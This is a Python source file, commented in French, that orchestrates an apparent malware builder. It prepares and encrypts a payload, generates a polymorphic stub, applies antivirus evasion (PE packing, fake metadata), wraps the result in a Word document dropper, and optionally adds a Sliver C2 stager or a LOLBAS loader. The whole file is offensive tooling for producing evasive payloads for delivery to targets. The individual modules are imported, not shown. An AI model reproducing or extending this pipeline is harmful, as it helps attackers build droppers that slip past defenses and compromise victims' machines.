import os
import json
from datetime import datetime

from .logger import Logger
from modules.payloads.payload_preparer import PayloadPreparer
from modules.encryption.encryptor import EncryptionCoordinator
from modules.stub.stubgen import StubGenerator
from modules.evasion.pe_packer import PEPacker
from modules.evasion.metafaker import MetaFaker
from documents.word_dropper.generate_doc import WordDropperGenerator
from modules.loaders.lolbas_loader import LOLBASLoader
from modules.stagers.stager_sliver import SliverStager  # nouveau
from modules.report.report_generator import ReportGenerator  # à venir


class BuildDispatcher:
    def __init__(self, config, log_callback=None):
        self.config = config
        self.logger = Logger()
        self.log_callback = log_callback or print
        self.build_id = datetime.now().strftime("%Y%m%d_%H%M%S")
        self.output_path = os.path.join(config['output_dir'], self.build_id)

    def log(self, message):
        self.logger.log(message)
        if self.log_callback:
            self.log_callback(message)

    def build_all(self):
        try:
            os.makedirs(self.output_path, exist_ok=True)

            self.log("📦 Phase 1 : Préparation du payload...")
            payload_data = self._prepare_payload()

            self.log("🔐 Phase 2 : Chiffrement des données...")
            encrypted_data, keys = self._encrypt_payload(payload_data)

            self.log("🧬 Phase 3 : Génération du stub polymorphe...")
            stub_path = self._generate_stub(encrypted_data, keys)

            self.log("🕵️ Phase 4 : Techniques d'évasion...")
            evaded_stub = self._apply_evasion(stub_path)

            self.log("🚀 Phase 5 : Génération du format final...")
            final_output = self._generate_output(evaded_stub)

            # Optional: Génération stager Sliver
            if self.config.get("c2_stager") == "sliver":
                self.log("📡 Ajout du stager Sliver...")
                SliverStager().generate(final_output, self.output_path)

            # Optional: Loader LOLBAS
            if self.config.get("lolbas_loader"):
                technique = self.config["lolbas_loader"]
                self.log(f"🎯 Génération loader LOLBAS : {technique}")
                loader_path = LOLBASLoader().generate_loader(technique, final_output, self.output_path)
                final_output = loader_path

            # Rapport final
            self._generate_report(final_output, encrypted_data, keys)

            self.log(f"✅ Build terminé avec succès ! Fichier final : {final_output}")
            return True, final_output

        except Exception as e:
            self.log(f"❌ Build échoué : {e}")
            return False, None

    # === PHASES INTERNES ===

    def _prepare_payload(self):
        preparer = PayloadPreparer()
        return preparer.prepare(self.config['payload_path'])

    def _encrypt_payload(self, payload_data):
        coordinator = EncryptionCoordinator(self.config['encryption_method'])
        return coordinator.encrypt_payload(payload_data)

    def _generate_stub(self, encrypted_data, keys):
        stub_gen = StubGenerator(self.config['evasion_level'])
        return stub_gen.generate_stub(encrypted_data, keys, self.output_path)

    def _apply_evasion(self, stub_path):
        if self.config['evasion_level'] in ['High', 'Maximum']:
            packed = PEPacker().pack(stub_path)
            faked = MetaFaker().add_fake_metadata(packed)
            return faked
        return stub_path

    def _generate_output(self, final_stub):
        fmt = self.config.get('target_format', 'Standalone EXE')
        if fmt.lower() in ['word', 'word document']:
            return WordDropperGenerator().generate(final_stub, self.output_path)
        return final_stub

    def _generate_report(self, output_file, ciphertext, keys):
        try:
            report_data = {
                "build_id": self.build_id,
                "output_file": output_file,
                "encryption": self.config.get("encryption_method"),
                "evasion_level": self.config.get("evasion_level"),
                "target_format": self.config.get("target_format"),
                "output_size": os.path.getsize(output_file),
                "keys": {k: v.hex() if isinstance(v, (bytes, bytearray)) else v for k, v in keys.items()}
            }
            report_path = os.path.join(self.output_path, "build_report.json")
            with open(report_path, "w") as f:
                json.dump(report_data, f, indent=4)
            self.log(f"📊 Rapport sauvegardé : {report_path}")
        except Exception as e:
            self.log(f"[!] Erreur lors de la génération du rapport : {e}")
